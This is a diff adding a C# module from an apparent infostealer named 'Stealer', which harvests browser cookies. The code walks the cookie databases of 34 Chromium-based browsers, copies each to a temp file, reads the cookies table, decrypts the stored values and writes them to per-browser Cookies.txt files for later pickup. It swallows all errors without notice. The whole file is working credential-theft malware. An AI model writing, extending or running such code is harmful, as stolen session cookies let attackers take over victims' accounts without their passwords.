@@ -1,0 +1,110 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+
+namespace Stealer.modules
+{
+  internal class Cookies
+  {
+    public static void GetCookies()
+    {
+      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
+      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
+      string str3 = "\\User Data\\Default\\Cookies";
+       string[] strArray1 = new string[34]
+            {
+        str2 + "Google\\Chrome" + str3,
+        str2 + "Google(x86)\\Chrome" + str3,
+        str2 + "Chromium" + str3,
+        str2 + "Microsoft\\Edge" + str3,
+        str1 + "Opera Software\\Opera Stable\\Cookies",
+        str2 + "BraveSoftware\\Brave-Browser" + str3,
+        str2 + "Epic Privacy Browser" + str3,
+        str2 + "Amigo" + str3,
+        str2 + "Vivaldi" + str3,
+        str2 + "Orbitum" + str3,
+        str2 + "AcWebBrowser" + str3,
+        str2 + "Mail.Ru\\Atom" + str3,
+        str2 + "CentBrowser" + str3,
+        str2 + "Rockmelt" + str3,
+        str2 + "Kometa" + str3,
+        str2 + "Comodo\\Dragon" + str3,
+        str2 + "Torch" + str3,
+        str2 + "Flock" + str3,
+        str2 + "Black Hawk" + str3,
+        str2 + "Maple Studio" + str3,
+        str2 + "CoolNovo" + str3,
+        str2 + "Titan Browser" + str3,
+        str2 + "Baidu Spark" + str3,
+        str2 + "Comodo" + str3,
+        str2 + "Slimjet" + str3,
+        str2 + "360Browser\\Browser" + str3,
+        str2 + "Maxthon" + str3,
+        str2 + "K-Melon" + str3,
+        str2 + "Sputnik\\Sputnik" + str3,
+        str2 + "Nichrome" + str3,
+        str2 + "CocCoc\\Browser" + str3,
+        str2 + "uCozMedia\\Uran" + str3,
+        str2 + "Chromodo" + str3,
+        str2 + "Yandex\\YandexBrowser" + str3
+            };
+      List<string[]> strArrayList = new List<string[]>();
+      try
+      {
+        foreach (string str4 in strArray1)
+        {
+          if (File.Exists(str4))
+          {
+            string str5 = "";
+            foreach (string str6 in Help.BrowsersName)
+            {
+              if (str4.Contains(str6))
+                str5 = str6;
+            }
+            string str7 = Environment.GetEnvironmentVariable("temp") + "\\browserCookies";
+            if (File.Exists(str7))
+              File.Delete(str7);
+            File.Copy(str4, str7);
+            cSQLite cSqLite = new cSQLite(str7);
+            cSqLite.ReadTable("cookies");
+            for (int rowNum = 0; rowNum < cSqLite.GetRowCount(); ++rowNum)
+            {
+              string password = cSqLite.GetValue(rowNum, 12);
+              string str6 = cSqLite.GetValue(rowNum, 1);
+              string text = cSqLite.GetValue(rowNum, 2);
+              string str8 = cSqLite.GetValue(rowNum, 4);
+              string str9 = cSqLite.GetValue(rowNum, 5);
+              string upper = cSqLite.GetValue(rowNum, 6).ToUpper();
+              if (!string.IsNullOrEmpty(text))
+              {
+                string[] strArray2 = new string[7]
+                {
+                  Crypt.toUTF8(Crypt.decryptChrome(password, str4)),
+                  str6,
+                  Crypt.toUTF8(text),
+                  str8,
+                  str9,
+                  upper,
+                  str5
+                };
+                strArrayList.Add(strArray2);
+              }
+              else
+                break;
+            }
+          }
+        }
+      }
+      catch
+      {
+      }
+      string str10 = Program.path + "\\";
+      foreach (string[] strArray2 in strArrayList)
+      {
+        Directory.CreateDirectory(str10 + strArray2[6]);
+        using (StreamWriter streamWriter = new StreamWriter(str10 + strArray2[6] + "\\Cookies.txt", true))
+          streamWriter.Write("{0}\tFALSE\t{1}\t{2}\t{3}\t{4}\t{5}\r\n", (object) strArray2[1], (object) strArray2[3], (object) strArray2[5].ToUpper(), (object) strArray2[4], (object) strArray2[2], (object) strArray2[0]);
+      }
+    }
+  }
+}
